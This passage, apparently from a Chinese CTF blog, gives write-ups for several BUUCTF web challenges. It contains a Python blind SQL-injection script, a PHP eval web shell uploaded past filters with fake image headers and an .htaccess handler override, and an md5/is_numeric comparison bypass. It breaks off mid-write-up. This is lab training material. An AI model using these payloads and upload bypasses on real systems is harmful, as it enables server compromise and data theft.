class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br><br></code></pre></td></tr></table></figure>
<p>先跑出数据库名：<br>ctftraining<br>然后题目给了表明和列明，那直接爆flag就行，那我跑库名干什么？<br>就当测试吧  </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># str= &quot;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&quot;</span><br>url = <span class="hljs-string">&#x27;http://b74d121d-ae37-46c5-9e40-49750c875c6b.node5.buuoj.cn:81/index.php&#x27;</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>flag=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> le <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload= <span class="hljs-string">&#x27;1^((length((select(flag)from(flag))))&lt;&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(le)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;测试flag长度中:&quot;</span>,le)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag长度为:&quot;</span>,le)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,le+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">117</span>):<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        payload = <span class="hljs-string">&#x27;1^((ascii(substr((select(flag)from(flag)),&#123;&#125;,1)))=&#123;&#125;)&#x27;</span>.<span class="hljs-built_in">format</span>(i,l)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag名称第:&quot;</span>,i,<span class="hljs-string">&quot;个字符&quot;</span>,<span class="hljs-built_in">chr</span>(l),<span class="hljs-string">&#x27;    &#x27;</span>,flag)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Error Occured When Fetch Result.&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag+<span class="hljs-built_in">chr</span>(l)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag:&quot;</span>,flag)<br>            <span class="hljs-keyword">break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br><span class="hljs-comment"># flag=&#x27;&#x27;</span><br><span class="hljs-comment"># for l in range (1,10000):</span><br><span class="hljs-comment">#     f=&#x27;&#x27;</span><br><span class="hljs-comment">#     for s in range (32,127):</span><br><span class="hljs-comment">#         time.sleep(0.08)</span><br><span class="hljs-comment">#         f=flag + chr(s)</span><br><span class="hljs-comment">#         payload = &#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;.format(f)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             flag=flag + chr(s-1)</span><br><span class="hljs-comment">#             print(flag.lower)</span><br><span class="hljs-comment">#             break</span><br></code></pre></td></tr></table></figure>
<p>可能是我昨晚做迷糊了，卡在length和substr里面用select需要再加一层括号里，卡了一个半小时，到凌晨3点半，<br>一道题做了三个半小时，道心破碎了；<br>至少最后独立做出来了；<br>flag{e53ac9ec-ab18-44e9-89b4-f1b39d8f813c}</p>
<h1 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h1><p>先传个🐎看看：  </p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">传php木马：<br>回显：后缀名不能有ph！<br><br>传正常png文件：<br>上传类型也太露骨了吧！<br><br>传<span class="hljs-keyword">jpg看看：</span><br><span class="hljs-keyword"></span>上传类型也太露骨了吧！<br></code></pre></td></tr></table></figure>
<p>不管了，bp抓包改  </p>
<figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xquery">Content-Disposition: form-data;<span class="hljs-built_in"> name</span>=<span class="hljs-string">&quot;uploaded&quot;</span>; filename=<span class="hljs-string">&quot;shell.jpeg&quot;</span><br>Content-Type: image/jpeg<br><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript">@<span class="hljs-built_in">eval</span>($_POST[zhong]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;</span><span class="language-javascript"><span class="hljs-title function_">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><br>成功：<br>/var/www/html/upload/<span class="hljs-number">407</span>deea951641fdc86613277efecd816/shell.jpeg succesfully uploaded!<br></code></pre></td></tr></table></figure>
<p>在浏览器上访问成功，但是用蚂蚁连接不上，应该也是没目录没php解析的问题，<br>观察到服务器端为apache<br>那应该就是尝试.htaccess</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-params">Content-Disposition:</span> form-data; <span class="hljs-attr">name</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;uploaded&quot;</span>; <span class="hljs-attr">filename</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;.htaccess&quot;</span><br><span class="hljs-params">Content-Type:</span> image<span class="hljs-symbol">/jpeg</span><br><br>SetHandler application<span class="hljs-symbol">/x-httpd-php</span><br><br><span class="hljs-symbol">/var/www/html/upload/407deea951641fdc86613277efecd816/.htaccess</span> succesfully uploaded<span class="hljs-operator">!</span><br></code></pre></td></tr></table></figure>
<p>蚂蚁连接成功，在根目录找到flag<br>本来看到这串路径我还以为是随机目录之类的    </p>
<p>乘机试了一下，想在.htaccess文件中直接添加木马，结果连不上，可能是不行吧<br>在upload目录下搞得，还把环境搞坏了</p>
<h1 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h1><p>打开题目：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php">I put something in F12 <span class="hljs-keyword">for</span> you<br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag.php&#x27;</span>;<br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br>    <span class="hljs-variable">$gg</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;gg&#x27;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$id</span>) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$gg</span>) &amp;&amp; <span class="hljs-variable">$id</span> !== <span class="hljs-variable">$gg</span>) &#123; <span class="hljs-comment">//md5绕过，要求两个值不相等但是计算的md5相等，</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You got the first step&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$passwd</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;passwd&#x27;</span>];<br>            <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$passwd</span>))<br>            &#123;<br>                 <span class="hljs-keyword">if</span>(<span class="hljs-variable">$passwd</span>==<span class="hljs-number">1234567</span>)<br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Good Job!&#x27;</span>;<br>                     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>                     <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;By Retr_0&#x27;</span>);<br>                 &#125;  <br>                 <span class="hljs-keyword">else</span><br>                 &#123;<br>                     <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;can you think twice??&quot;</span>;<br>                 &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You can not get it !&#x27;</span>;<br>            &#125;<br><br>        &#125;<br>        <span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;only one way to get the flag&#x27;</span>);<br>        &#125;<br>&#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You are not a real hacker!&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Please input first&#x27;</span>);<br>&#125;<br>&#125;Please input first<br></code></pre></td></tr></table></figure>
<p>第一先试一下数组绕过：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>You got the first steponly one way to get the flag<br></code></pre></td></tr></table></figure>
<p>然后添加post数据：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">?id[]=<span class="hljs-number">0</span>&amp;gg[]=<span class="hljs-number">1</span><br><br>passwd=<span class="hljs-number">1234567</span><br><br>You got the first stepYou can not get it !<br></code></pre></td></tr></table></figure>
<p>要对is_numeric进行绕过，源码里的：<br>if (!is_numeric($passwd))<br>是不能是纯数字意思<br>那passwd&#x3D;1234567aa，<br>拿到flag，  </p>
<h2 id="php比较绕过-is-numeric"><a href="#php比较绕过-is-numeric" class="headerlink" title="php比较绕过 is_numeric()"></a>php比较绕过 is_numeric()</h2><p>因为php对字符串类型与整数类型进行&#x3D;&#x3D;比较时会把字符串转化为整型数据，<br>此时<br>1234567aa 就会变为 1234567<br>实现比较</p>
<hr>
<h2 id="title-note-33date-2025-05-07-13-05-02tags-web"><a href="#title-note-33date-2025-05-07-13-05-02tags-web" class="headerlink" title="title: note-33date: 2025-05-07 13:05:02tags: web"></a>title: note-33<br>date: 2025-05-07 13:05:02<br>tags: web</h2><h1 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h1><p>传正常图片提示里面有&lt;?不给传，传码看看：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>407<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryE46PLUBJtp0zgdcj<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundaryE46PLUBJtp0zgdcj--</span></span><br></code></pre></td></tr></table></figure>
<p>提示：<br>exif_imagetype:not image!</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary8mJUC80q1aGOXScd<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">FFD8FF</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary8mJUC80q1aGOXScd--</span></span><br></code></pre></td></tr></table></figure>
<p>提示：<br>exif_imagetype:not image!</p>
<p>这次换个文件头：</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/index.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>403<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundary3I0b63Tc4FZzgA5s<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://5f2a0c7d-2bd7-429f-8299-9f0f5b659699.node5.buuoj.cn:81/index.php<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;fileUpload&quot;; filename=&quot;php2.jpg&quot;</span><br><span class="language-pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpg</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">GIF89a</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;@eval($_POST[shell]);&lt;/script&gt;</span><br><span class="language-pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;cat /flag&#x27;</span>);&lt;/script&gt;</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s</span></span><br><span class="language-pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;upload&quot;</span><br><span class="language-pgsql"></span><br><span class="language-pgsql">提交</span><br><span class="language-pgsql"><span class="hljs-comment">------WebKitFormBoundary3I0b63Tc4FZzgA5s--</span></span><br></code></pre></td></tr></table></figure>
<p>回显  </p>
